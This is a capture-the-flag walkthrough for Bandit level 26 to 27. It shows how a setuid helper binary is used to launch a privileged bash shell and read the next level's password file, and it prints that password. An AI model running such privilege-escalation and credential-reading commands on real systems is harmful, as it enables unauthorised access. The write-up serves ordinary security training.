# Bandit Level 26 -> Level 27:

In this level we find a binary in the home directory called "bandit27-do", which has suid permissions:

```sh
bandit26@bandit:~$ file bandit27-do
bandit27-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=037b97b430734c79085a8720c90070e346ca378e, for GNU/Linux 3.2.0, not stripped
bandit26@bandit:~$ ./bandit27-do
Run a command as another user.
  Example: ./bandit27-do id
```

As we can see, we can run commands as user bandit27 with this program. As this is a compiled binary we can not see the original source code, so we use the strings command to get information about what commands are used in the binary:

```sh
bandit26@bandit:~$ strings bandit27-do
tdL
/lib/ld-linux.so.2
0sLy
_IO_stdin_used
exit
__libc_start_main
execv
printf
libc.so.6
GLIBC_2.0
GLIBC_2.34
__gmon_start__
Run a command as another user.
  Example: %s id
/usr/bin/env
```

`/usr/bin/env` is executed with the suid permissions as it seems. This means, we can run the binary and get a shell as the bandit27 user:

```
bandit26@bandit:~$ ./bandit27-do /bin/bash -p
bash-5.1$ whoami
bandit27
bash-5.1$ cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
```

We need to supply the `-p` flag in order to start bash under the euid.
